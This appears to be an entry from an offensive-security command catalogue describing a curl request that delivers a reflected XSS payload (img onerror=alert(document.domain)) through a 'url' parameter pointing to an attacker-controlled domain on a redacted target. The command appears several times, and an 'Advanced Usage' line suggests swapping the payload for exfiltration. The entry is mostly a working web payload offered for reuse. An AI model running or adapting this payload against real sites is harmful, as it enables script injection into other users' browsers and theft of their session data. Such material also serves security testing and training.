---
id: cmd-uuid-1-1149144
data: >-
  curl
  "https://█████/████&url=http%3a%2f%2fgalnagli.com%2f%3Cimg+src%3dx+onerror%3dalert%28document.domain%29%3E"
tags:
  - xss
  - exploit
type: command
output: Server response with rendered XSS payload triggering alert in browser
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:12.520Z'
verified: false
validated: true
submitted: true
---
# access-vulnerable-endpoint-with-xss-payload

## Command

```bash
curl "https://█████/████&url=http%3a%2f%2fgalnagli.com%2f%3Cimg+src%3dx+onerror%3dalert%28document.domain%29%3E"
```

## Description

This command accesses the vulnerable web endpoint by supplying a URL-encoded parameter pointing to an attacker-controlled domain with an XSS payload in the path, demonstrating reflected XSS execution upon rendering.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | Encoded malicious URL with XSS in path | Yes |

## Examples

### Basic Usage

```bash
curl "https://█████/████&url=http%3a%2f%2fgalnagli.com%2f%3Cimg+src%3dx+onerror%3dalert%28document.domain%29%3E"
```

### Advanced Usage

Replace domain and payload for custom alerts or exfiltration.

## Expected Output

HTTP response containing the fetched and rendered content, with the <img> tag triggering onerror=alert(document.domain) in the browser context.

## Related

- [[commands/embed-xss-payload-in-url-path]]
- [[procedures/Exploit-Reflected-XSS-via-Malicious-URL]]
